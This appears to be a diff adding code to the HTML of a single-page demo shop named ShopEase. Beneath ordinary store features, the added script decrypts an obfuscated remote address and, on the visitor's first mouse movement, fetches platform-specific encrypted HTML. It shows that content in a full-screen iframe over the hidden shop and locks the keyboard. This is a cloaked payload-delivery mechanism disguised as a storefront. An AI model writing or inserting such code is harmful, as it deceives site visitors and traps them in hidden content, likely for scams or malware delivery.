+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19PP9rw5bqnzSMZaqZhEB/iwqE0KjDEy6hSKaB+5VK5z6gGn4EjFVR7";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
